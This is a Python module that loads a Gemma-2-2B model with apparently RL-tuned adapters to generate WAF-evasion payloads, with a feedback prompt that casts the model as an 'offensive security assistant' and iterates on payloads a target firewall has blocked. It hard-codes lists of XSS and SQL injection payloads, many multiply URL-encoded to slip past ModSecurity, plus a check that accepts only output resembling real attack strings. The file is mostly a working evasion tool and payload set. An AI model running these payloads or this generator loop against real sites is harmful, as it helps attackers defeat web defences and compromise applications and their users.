


import os
from dataclasses import dataclass
from config.settings import HF_ACCESS_TOKEN



from typing import List

@dataclass
class PayloadResult:
    payload: str
    technique: str
    attack_type: str
    bypassed: bool
    status_code: int = None

class Gemma2B:
    def __init__(self):
        self.loaded = False
    
    def load_model(self):
        if self.loaded:
            return
        print("Lazy loading Gemma-2-2B model...")
        # Lazy load model dependencies
        import torch
        from transformers import (
            AutoTokenizer,
            AutoModelForCausalLM,
            BitsAndBytesConfig,
        )
        from peft import PeftModel
        
        self.no_grad = torch.no_grad
        # Check for CUDA availability
        if torch.cuda.is_available():
            print("Using CUDA device")
            print([torch.cuda.get_device_name(i) for i in range(torch.cuda.device_count())])
            self.device = torch.device("cuda")
        else:
            print("Using CPU device")
            self.device = torch.device("cpu")
            
        self.base_model = "google/gemma-2-2b-it"
        model_dir = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'model')
        self.phase1_adapter_path = os.path.join(model_dir, "remote_gemma2_2b_phase1")
        self.phase3_adapter_path = os.path.join(model_dir, "remote_gemma2_2b_phase3_rl")
        bnb_config = BitsAndBytesConfig(
            load_in_4bit=True, bnb_4bit_quant_type="nf4", bnb_4bit_compute_dtype=torch.float16
        )
        self.model = AutoModelForCausalLM.from_pretrained(
            self.base_model, quantization_config=bnb_config, device_map={"": 0}, token=HF_ACCESS_TOKEN, local_files_only=True
        )
        # Load phase3_rl as primary adapter, then phase1 as a named adapter
        self.model = PeftModel.from_pretrained(self.model, self.phase3_adapter_path, adapter_name="phase3_rl")
        self.model.load_adapter(self.phase1_adapter_path, adapter_name="phase1")
        self.tokenizer = AutoTokenizer.from_pretrained(self.base_model, token=HF_ACCESS_TOKEN, local_files_only=True)
        self.loaded = True
        print("Model loaded successfully (phase1 + phase3_rl adapters).")
    
    def generate_response(self, prompt: str, max_new_tokens: int = 128, temperature: float = 0.7, adapter_name: str = "phase3_rl") -> str:
        if not self.loaded:
            self.load_model()
        self.model.set_adapter(adapter_name)
        messages = [{"role": "user", "content": prompt}]
        formatted_prompt = self.tokenizer.apply_chat_template(
            messages, tokenize=False, add_generation_prompt=True
        )
        inputs = self.tokenizer(formatted_prompt, return_tensors="pt").to(self.model.device)
        input_length = inputs.input_ids.shape[1]
        eos_id = self.tokenizer.eos_token_id
        with self.no_grad():
            outputs = self.model.generate(
                **inputs,
                max_new_tokens=max_new_tokens,
                temperature=temperature,
                do_sample=True,
                eos_token_id=eos_id,
                pad_token_id=eos_id,
                repetition_penalty=1.3,
            )
        response = self.tokenizer.decode(outputs[0][input_length:], skip_special_tokens=True)
        return response
    
    def clean_payload(self, generated_text: str) -> str:
        payload = generated_text.strip()
        # Strip code fences
        if payload.startswith("```") or payload.startswith("`"):
            lines = payload.split("\n")
            payload = "\n".join([l for l in lines if not l.strip().startswith("`")])
            payload = payload.strip()
        # Take only the first non-empty line (avoid hallucinated multi-line HTML)
        for line in payload.splitlines():
            line = line.strip()
            if line and not line.startswith("Note") and not line.startswith("Explanation"):
                return line
        return payload

    _XSS_FALLBACK_PAYLOADS = [
        # Double URL-encoded payloads (bypass ModSecurity PL1 URL-decode check)
        "%25253CBoDY%252520OnloAD%25253dALErT%2525281%252529%25253e",
        "%25253CBoDY%252520ONLOad%25253DALERt%2525281%252529%25253E",
        "%25253cScripT%25253eALeRt%2525281%252529%25253C/ScrIPT%25253E",
        "%25253cScRiPt%25253Ealert%2525281%252529%25253c/scRipt%25253E",
        "%25253ciframe%252520srC%25253djAVAsCRIPT%25253aAleRt%2525281%252529%25253e",
        # Single URL-encoded (bypass if WAF applies transforms incorrectly)
        "%253cifRaME%252509SrC%253DjavascrIPt%253aalert%25281%2529%253E",
        "%253CiMg%252509sRc%253DX%252509OnError%253DALeRT%25281%2529%253E",
        "%253CSCrIPt%253EALERt%25281%2529%253C/scRIPt%253E",
        "%253cImg%252509SrC%253DX%252509OnerroR%253daLert%25281%2529%253e",
        # JavaScript protocol with comment obfuscation
        "JaVAS%2f%2a%2520%2a%2fcRIPT%3aCONFIRM%2842%29",
        # HTML5 elements less commonly checked
        "<details open ontoggle=alert(1)>",
        "<video/src=x onerror=alert(1)>",
        "<math href=javascript:alert(1)>click</math>",
        "<svg><animate onbegin=alert(1)>",
        "<marquee onstart=alert(1)>",
        # Case-mangled known bypasses
        "<iMg SrC=x oNeRrOr=alert(1)>",
        "<sVg/OnLoAd=alert(1)>",
    ]
    _SQLI_FALLBACK_PAYLOADS = [
        # Double/triple URL-encoded SQLI (bypass ModSecurity PL1)
        "Admin%252527%252520--",
        "ADMIN'\u2028--",
        "%25252527%25252520AND%252525201%2525253D%25252528SELECT%252525201%252F0%25252529",
        "%2527%2520UNION%2520SELECT%25201%252C2%2520WHERE%2520DATABASE%2528%2529%253D%2527test_db%2527%2520--",
        "--%2520%252F%252A68%252A%252F -- 9",
        # Comment obfuscation with double URL encoding
        "%25252527%2F%2525252A%2525252a%2FUNiOn%2f%2525252a%2525252a%2FSELECT%2f%2525252A%2525252A%2f1%2525252cuSer%25252528%25252529%2525252C3--%2F%2525252A%2525252a%2F",
        # Standard SQLI fallbacks
        "' OR '1'='1",
        "1' OR '1'='1'--",
        "' UNION SELECT null,null--",
        "1 AND 1=1--",
        "' OR 1=1#",
        "' OR/**/1=1--",
        "1/*!UNION*//*!SELECT*/null,null--",
        "1 UnIoN SeLeCt null,null--",
        "1%20AND%201%3D1--",
        "' OR 0x31=0x31--",
        "1' AND SLEEP(5)--",
        "' UNION ALL SELECT null,null,null--",
        "1 OR 1=1--",
        "' oR '1'='1",
    ]

    def _is_valid_payload(self, payload: str, attack_type: str) -> bool:
        """Return True if model output looks like a real attack payload."""
        import re
        p = payload.lower()
        if "xss" in attack_type.lower():
            # Must contain at least ONE attack indicator
            return bool(re.search(r'<\s*(script|svg|img|iframe|body|input|details|math|object|embed)', p)
                        or re.search(r'\bon\w+\s*=', p)
                        or re.search(r'javascript\s*:', p)
                        or 'fromcharcode' in p
                        or '&#' in p)
        elif "sql" in attack_type.lower():
            return bool(re.search(r'\b(union|select|from|sleep|benchmark|wait|or|and)\b', p)
                        or '--' in payload or '#' in payload)
        return True  # for unknown attack types, accept anything

    def get_fallback_payload(self, attack_type: str) -> str:
        import random
        if "xss" in attack_type.lower():
            return random.choice(self._XSS_FALLBACK_PAYLOADS)
        elif "sql" in attack_type.lower():
            return random.choice(self._SQLI_FALLBACK_PAYLOADS)
        return "<svg onload=alert(1)>"
    
    def build_phase1_prompt(self, waf_name: str, attack_type: str, technique: str) -> str:
        attack_type_code = "XSS" if "xss" in attack_type.lower() else "SQLI"
        prompt = (
            f"Generate a full bypass payload for {attack_type_code} using {technique}.\n\n"
            "IMPORTANT: Generate ONLY the payload code. Do not provide explanations."
        )
        return prompt


    def build_phase3_prompt(self, waf_name: str, attack_type: str, probe_history: List[PayloadResult]) -> str:
        history_str = ""
        tried_techniques = set()
        for i, h in enumerate(probe_history):
            history_str += f"{i+1}. Payload: `{h.payload}` (Technique: {h.technique}) -> RESULT: {'BYPASSED' if h.bypassed else 'BLOCKED'}\n"
            tried_techniques.add(h.technique)

        # Pick next technique: prefer one not yet tried
        xss_techniques = [
            "SVG Event Handler", "Unicode Normalization", "IMG Tag with OnError",
            "Javascript Pseudo-protocol in A Tag", "Case Manipulation",
            "Double URL Encode", "Hex Encoding", "HTML Entity Encode",
            "Attribute Injection", "DOM clobbering"
        ]
        sqli_techniques = [
            "Double URL Encode", "Comment Obfuscation (/**/)", "Hex Encoding",
            "Boolean-based Blind", "Time-based Blind", "Union Select",
            "Case Manipulation", "Whitespace Bypass", "Inline Comment Versioning"
        ]
        candidates = sqli_techniques if "sql" in attack_type.lower() else xss_techniques
        remaining = [t for t in candidates if t not in tried_techniques]
        import random
        target_technique = random.choice(remaining) if remaining else random.choice(candidates)

        prompt = f"""You are an offensive security assistant specialized in generating WAF-evasion payloads.

Context:
- Target WAF: {waf_name}.
- Attack type: {attack_type}.
- Injection point: query parameter.

Previously tried payloads against this target (all blocked by the WAF):
{history_str}

Your task:
Generate a NEW {attack_type} payload that has a higher chance of bypassing this WAF while still reaching and triggering the underlying vulnerability.
Use the following core technique as the main idea for the payload:
- Technique: {target_technique}

You may combine this technique with additional obfuscation tricks if it helps evade the filter, but keep the payload compact and realistic.

IMPORTANT:
- Output ONLY the final payload string.
- Do NOT add explanations or comments.
- Do NOT wrap it in code fences."""
        return prompt


gemma_2b_model = Gemma2B()
